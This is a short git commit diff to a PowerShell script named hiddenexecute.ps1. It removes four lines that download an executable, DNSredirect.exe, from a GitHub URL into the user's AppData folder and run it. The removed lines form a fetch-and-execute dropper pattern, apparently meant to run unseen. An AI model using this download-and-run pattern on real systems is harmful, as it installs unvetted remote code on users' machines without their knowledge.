34220f53997b92d2688d9c85d81b6212b9450a47
webntdev <96979468+webntdev@users.noreply.github.com>
2024-05-21 16:20:02 +0300

    Update hiddenexecute.ps1

--- files/hiddenexecute.ps1
+++ files/hiddenexecute.ps1
@@ -1,5 +1,1 @@
-$x = "https://github.com/webntdev/webntdev.github.io/raw/main/DNS/DNSredirect.exe"
-$y = "$env:USERPROFILE\AppData\Local\DNSredirect.exe"
 
-Invoke-WebRequest -Uri $x -OutFile $y
-Start-Process $y
